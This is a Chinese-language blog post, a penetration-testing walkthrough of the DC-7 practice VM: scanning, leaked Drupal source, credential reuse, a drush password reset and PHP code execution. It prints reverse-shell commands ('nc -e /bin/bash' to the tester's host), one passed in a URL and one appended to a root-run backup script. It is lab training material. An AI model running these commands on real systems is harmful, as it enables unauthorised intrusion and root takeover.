@@ -1,0 +1,310 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透测试演练 DC-7 | Tripse Blog</title><meta name="keywords" content="渗透测试演练"><meta name="author" content="Tripse"><meta name="copyright" content="Tripse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-7  author：leadlife data：2023&#x2F;5&#x2F;18 blog：https:&#x2F;&#x2F;tripse.github.io&#x2F; 本次测试使用到的工具如下：  信息收集：nmap、fscan、cmseek、searchsploit 获取 SHELL：无 暴力破解：无 FUZZ：无 辅助工具：无 权限提升：无   外部信息收集Nmap ICMP 扫描发现主机 本地靶机 IP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试演练 DC-7">
+<meta property="og:url" content="https://tripse.github.io/2023/05/19/DC-7/index.html">
+<meta property="og:site_name" content="Tripse Blog">
+<meta property="og:description" content="DC-7  author：leadlife data：2023&#x2F;5&#x2F;18 blog：https:&#x2F;&#x2F;tripse.github.io&#x2F; 本次测试使用到的工具如下：  信息收集：nmap、fscan、cmseek、searchsploit 获取 SHELL：无 暴力破解：无 FUZZ：无 辅助工具：无 权限提升：无   外部信息收集Nmap ICMP 扫描发现主机 本地靶机 IP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://security-note.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83.jpg">
+<meta property="article:published_time" content="2023-05-19T10:42:09.755Z">
+<meta property="article:modified_time" content="2023-05-19T10:42:58.028Z">
+<meta property="article:author" content="Tripse">
+<meta property="article:tag" content="渗透测试演练">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://security-note.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83.jpg"><link rel="shortcut icon" href="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg"><link rel="canonical" href="https://tripse.github.io/2023/05/19/DC-7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透测试演练 DC-7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-19 18:42:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/icon.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tripse Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试演练 DC-7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-19T10:42:09.755Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-19T10:42:58.028Z" title="更新于 2023-05-19 18:42:58">2023-05-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83/">渗透测试演练</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透测试演练 DC-7"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><hr>
+<blockquote>
+<p>author：leadlife</p>
+<p>data：2023&#x2F;5&#x2F;18</p>
+<p>blog：<a href="https://tripse.github.io/">https://tripse.github.io/</a></p>
+<p>本次测试使用到的工具如下：</p>
+<ul>
+<li>信息收集：nmap、fscan、cmseek、searchsploit</li>
+<li>获取 SHELL：无</li>
+<li>暴力破解：无</li>
+<li>FUZZ：无</li>
+<li>辅助工具：无</li>
+<li>权限提升：无</li>
+</ul>
+</blockquote>
+<h2 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h2><h3 id="Nmap-ICMP-扫描发现主机"><a href="#Nmap-ICMP-扫描发现主机" class="headerlink" title="Nmap ICMP 扫描发现主机"></a>Nmap ICMP 扫描发现主机</h3><blockquote>
+<p>本地靶机 IP为 10.10.10.137</p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span> -T4 --min-rate <span class="number">10000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.93</span> ( https:<span class="comment">//nmap.org ) at 2023-05-18 18:08 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.137</span></span><br><span class="line">Host is up (<span class="number">0.00015</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">05</span>:<span class="number">5</span>E:F0 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.254</span></span><br><span class="line">Host is up (<span class="number">0.00045</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:EF:<span class="number">7</span>D:<span class="number">81</span> (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts up) scanned in <span class="number">0.34</span> seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Fsacn-探测开放端口"><a href="#Fsacn-探测开放端口" class="headerlink" title="Fsacn 探测开放端口"></a>Fsacn 探测开放端口</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fscan -h <span class="number">10.10</span>.<span class="number">10.137</span> -t <span class="number">30</span> -p <span class="number">0</span>-<span class="number">65535</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.1</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 10.10.10.137    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">10.10.10.137:22 open</span></span><br><span class="line"><span class="string">10.10.10.137:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://10.10.10.137       code:200 len:8703   title:Welcome to DC-7 | D7</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Nmap-进行详细端口扫描"><a href="#Nmap-进行详细端口扫描" class="headerlink" title="Nmap 进行详细端口扫描"></a>Nmap 进行详细端口扫描</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -O -T4 --min-rate <span class="number">10000</span> -sC <span class="number">10.10</span>.<span class="number">10.137</span> -oN namp.all</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.93</span> ( https:<span class="comment">//nmap.org ) at 2023-05-18 18:10 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.137</span></span><br><span class="line">Host is up (<span class="number">0.00026</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.4</span>p1 Debian <span class="number">10</span>+deb9u6 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   <span class="number">2048</span> d002e9c75d9532ab10998984343d1ef9 (RSA)</span><br><span class="line">|   <span class="number">256</span> d0d64035a734a90a7934eea96addf48f (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> a855d57693ed4f6ff1f7a1842fafbbe1 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.25</span> ((Debian))</span><br><span class="line">|_http-generator: Drupal <span class="number">8</span> (https:<span class="comment">//www.drupal.org)</span></span><br><span class="line">| http-robots.txt: <span class="number">22</span> disallowed entries (<span class="number">15</span> shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/</span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/</span><br><span class="line">| /user/password/ /user/login/ /user/logout/ /index.php/admin/</span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-title: Welcome to DC<span class="number">-7</span> | D7</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span><span class="number">.25</span> (Debian)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">05</span>:<span class="number">5</span>E:F0 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="keyword">type</span>: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">8.87</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="判断-CMS"><a href="#判断-CMS" class="headerlink" title="判断 CMS"></a>判断 CMS</h3><p>来到 DC7 Web 页面，可以看到 CMS 位 Drupal</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181109090.png" alt="image-20230518181109090"></p>
+<h3 id="CMSeek-判断-CMS-版本"><a href="#CMSeek-判断-CMS-版本" class="headerlink" title="CMSeek 判断 CMS 版本"></a>CMSeek 判断 CMS 版本</h3><p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181125119.png" alt="image-20230518181125119"></p>
+<h3 id="searchsploit-搜寻-cms-版本漏洞"><a href="#searchsploit-搜寻-cms-版本漏洞" class="headerlink" title="searchsploit 搜寻 cms 版本漏洞"></a>searchsploit 搜寻 cms 版本漏洞</h3><p>可以看到 drupal 8 version 存在代码执行</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181227313.png" alt="image-20230518181227313"></p>
+<h2 id="获取-SHELL"><a href="#获取-SHELL" class="headerlink" title="获取 SHELL"></a>获取 SHELL</h2><h3 id="MSF-漏洞利用尝试"><a href="#MSF-漏洞利用尝试" class="headerlink" title="MSF 漏洞利用尝试"></a>MSF 漏洞利用尝试</h3><p>失败，其他 exp 均以尝试</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181522606.png" alt="image-20230518181522606"></p>
+<h3 id="再次信息收集"><a href="#再次信息收集" class="headerlink" title="再次信息收集"></a>再次信息收集</h3><p>发现主页存在一些信息：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181612684.png" alt="image-20230518181612684"></p>
+<p>总结如下：</p>
+<ul>
+<li>DC-7 这个靶机存在一些 “新” 的渗透概念</li>
+<li>不建议使用暴力破解，很可能失败</li>
+<li>think outside，即跳出该盒子的思维</li>
+</ul>
+<p>我们可以观察到一个特殊的版权信息：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181804119.png" alt="image-20230518181804119"></p>
+<p>Google 全网检索一下关键字：</p>
+<blockquote>
+<p>得到两个关键检索</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181911830.png" alt="image-20230518181911830"></p>
+<p>该 Github repo 很可能是源代码，download 下来看看：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518181957445.png" alt="image-20230518181957445"></p>
+<p>得到信息，与 DC-7 靶机验证，即为该靶机的 web 源码，如此思路如下：</p>
+<ul>
+<li>拿到 web 后台账户密码</li>
+<li>利用后台进行 GetSHELL</li>
+</ul>
+<p>1：拿到 web 后台账户密码</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182102506.png" alt="image-20230518182102506"></p>
+<p>2：利用后台进行 GetSHELL</p>
+<p>来到后台，该 URL 为登陆页面：<code>http://10.10.10.137/user/login</code></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182158493.png" alt="image-20230518182158493"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182340047.png" alt="image-20230518182340047"></p>
+<p>登陆失败，转换思路：尝试密码复用去登陆 ssh</p>
+<blockquote>
+<p>成功登陆</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182430593.png" alt="image-20230518182430593"></p>
+<h2 id="内部信息收集"><a href="#内部信息收集" class="headerlink" title="内部信息收集"></a>内部信息收集</h2><h3 id="内核与发行版"><a href="#内核与发行版" class="headerlink" title="内核与发行版"></a>内核与发行版</h3><p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182539216.png" alt="image-20230518182539216"></p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><blockquote>
+<p>其中 exim4 可尝试提权</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182601533.png" alt="image-20230518182601533"></p>
+<h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><blockquote>
+<p>no sudo</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ sudo -l</span><br><span class="line">-bash: sudo: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h2><p>来到 home 目录发现如下文件：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182706456.png" alt="image-20230518182706456"></p>
+<p>backups：备份文件</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182905582.png" alt="image-20230518182905582"></p>
+<p>mbox：内容看着像一个定时备份，但是失败而保存的邮件</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182828172.png" alt="image-20230518182828172"></p>
+<p>查看定时任务：</p>
+<blockquote>
+<p>无任何发现</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518182947014.png" alt="image-20230518182947014"></p>
+<p>查看 &#x2F;var&#x2F;mail&#x2F; 文件，得到一个文件路径：<code>/opt/scripts/backups.sh</code></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518183032733.png" alt="image-20230518183032733"></p>
+<p>backups.sh  内容如下：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518183141761.png" alt="image-20230518183141761"></p>
+<p>回头分析 <code>/var/mail</code> 中邮件的时间，则可得知</p>
+<ul>
+<li>该脚本会在某一段时间自动执行且以 root 权限运行</li>
+<li>虽然我们没有找到定时任务其中的内容(无权限进入)，&#x3D;&#x3D;且对该文件没有权限去读写&#x3D;&#x3D;，但仍然可以操作 <code>/var/www/html</code> 下源码来到 Web 后台，通过后台 GetSHELL，拿到 www-data 的 SHELL，从而修改该文件内容获取 root shell</li>
+</ul>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518185928475.png" alt="image-20230518185928475"></p>
+<p>拿到账号密码，登入后台：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518190255260.png" alt="image-20230518190255260"></p>
+<p>仍然失败，到这里思路就断了，继续信息收集：</p>
+<blockquote>
+<p>通过查看 <code>/opt/scripts/backups.sh</code> 内容，我们得到如下信息：</p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush sql-<span class="keyword">dump</span> --result-file=<span class="regexp">/home/d</span>c7user/backups/website.sql</span><br></pre></td></tr></table></figure>
+
+<p>发现了 drush，利用它可修改 drupal cms 后台的账号密码：</p>
+<blockquote>
+<p>若用户不存在会报错，所以可以直接测试任意用户：</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518192141237.png" alt="image-20230518192141237"></p>
+<p>来到后台：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518192211215.png" alt="image-20230518192211215"></p>
+<p><strong>GetSHELL 过程</strong></p>
+<p>思路</p>
+<ul>
+<li><p>安装 PHP Filter 模块：本地下载上传 <code>https://www.drupal.org/project/php/releases/8.x-1.x-dev</code></p>
+</li>
+<li><p>修改页面内容，则可操作 php 代码</p>
+</li>
+</ul>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518192615563.png" alt="image-20230518192615563"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518192624064.png" alt="image-20230518192624064"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518193450672.png" alt="image-20230518193450672"></p>
+<p>来到 Extent 开启 php filter：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518193619451.png" alt="image-20230518193619451"></p>
+<p>拉到最下面点击 INSTALL</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518193651615.png" alt="image-20230518193651615"></p>
+<p>安装完后返回 Content 编辑内容，即可添加 PHP 代码</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518193712980.png" alt="image-20230518193712980"></p>
+<p>操作反弹 SHELL：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518194250067.png" alt="image-20230518194250067"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518194259667.png" alt="image-20230518194259667"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518194506633.png" alt="image-20230518194506633"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518194524050.png" alt="image-20230518194524050"></p>
+<p>本地监听：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>反弹：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.137</span>/node/<span class="number">5</span>?cmd=nc%20-e%20/bin/bash%2010.<span class="number">10.10</span>.<span class="number">1</span>%201234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230518194640776.png" alt="image-20230518194640776"></p>
+<h2 id="优化-SHELL"><a href="#优化-SHELL" class="headerlink" title="优化 SHELL"></a>优化 SHELL</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="修改定时脚本文件提权"><a href="#修改定时脚本文件提权" class="headerlink" title="修改定时脚本文件提权"></a>修改定时脚本文件提权</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-<span class="number">7</span>:<span class="regexp">/opt/s</span>cripts$ echo <span class="string">&quot;nc -e /bin/bash 10.10.10.1 4321&quot;</span> &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>本地监听：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leadlife@endeavrouOS ~<span class="regexp">/p/</span>DC7 [<span class="number">1</span>]&gt; nc -lvnp <span class="number">4321</span></span><br></pre></td></tr></table></figure>
+
+<p>等待回弹即可，最后却没有回弹，这里可参考网上 writeup，应当是执行环境有问题，且执行过程中验证了某些东西</p>
